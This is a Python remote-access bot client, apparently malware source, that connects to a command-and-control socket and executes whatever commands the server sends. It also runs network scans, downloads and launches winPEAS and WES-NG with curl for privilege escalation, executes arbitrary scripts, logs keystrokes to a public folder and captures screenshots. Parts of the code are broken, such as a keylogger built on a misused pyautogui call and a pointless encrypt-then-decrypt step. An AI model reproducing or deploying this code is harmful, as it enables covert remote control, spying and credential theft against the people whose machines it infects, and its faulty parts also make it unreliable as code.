# bot_payload.py

import socket
import subprocess
import os
import threading
import time
import pyautogui
from cryptography.fernet import Fernet
from ctypes import windll

# Configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9999
KEYLOG_FILE = "C:\\Users\\Public\\keylogs.txt"
ENCRYPTION_KEY = Fernet.generate_key()

# Function to execute system commands
def execute_system_command(command):
    return subprocess.getoutput(command)

# Function to scan the local network
def scan_local_network():
    return subprocess.getoutput("arp -a")

# Function to simulate privilege escalation using wesng and winPEAS
def privilege_escalation():
    wesng_url = "https://github.com/bitsadmin/wesng/releases/latest/download/wesng.zip"
    winpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe"
    
    wesng_file = "C:\\Users\\Public\\wesng.zip"
    winpeas_file = "C:\\Users\\Public\\winPEASany.exe"
    wesng_output = "C:\\Users\\Public\\wesng_output.txt"
    winpeas_output = "C:\\Users\\Public\\winpeas_output.txt"

    # Download wesng
    subprocess.run(f"curl -L -o {wesng_file} {wesng_url}", shell=True)
    subprocess.run(f"tar -xf {wesng_file} -C C:\\Users\\Public\\", shell=True)

    # Download winPEAS
    subprocess.run(f"curl -L -o {winpeas_file} {winpeas_url}", shell=True)

    # Run wesng
    subprocess.run(f"python C:\\Users\\Public\\WES-NG\\wes.py --all > {wesng_output}", shell=True)

    # Run winPEAS
    subprocess.run(f"{winpeas_file} > {winpeas_output}", shell=True)

    # Read output files
    with open(wesng_output, "r") as f:
        wesng_results = f.read()

    with open(winpeas_output, "r") as f:
        winpeas_results = f.read()

    return wesng_results + "\\n" + winpeas_results

# Function to encrypt and run scripts
def encrypt_and_run_script(script):
    cipher = Fernet(ENCRYPTION_KEY)
    encrypted_script = cipher.encrypt(script.encode())
    decrypted_script = cipher.decrypt(encrypted_script).decode()
    exec(decrypted_script)
    return "Script encrypted and executed."

# Function to start a keylogger
def start_keylogger():
    def on_press(key):
        with open(KEYLOG_FILE, "a") as log_file:
            log_file.write(f"{key}\\n")
    listener = pyautogui.keyDown(on_press)
    listener.start()
    return "Keylogger started."

# Function to capture screenshots
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("C:\\Users\\Public\\screenshot.png")
    return "Screenshot captured."

# Bot main function to connect to the C&C server
def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_HOST, SERVER_PORT))

    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == 'exit':
            break
        elif command.lower() == 'keylogger':
            response = start_keylogger()
        elif command.lower() == 'scan_network':
            response = scan_local_network()
        elif command.lower() == 'privilege_escalation':
            response = privilege_escalation()
        elif command.lower() == 'encrypt_and_run_script':
            script = 'print("This is a test script")'
            response = encrypt_and_run_script(script)
        elif command.lower() == 'screenshot':
            response = capture_screenshot()
        else:
            response = execute_system_command(command)

        client_socket.send(response.encode())

    client_socket.close()

if __name__ == "__main__":
    connect_to_server()
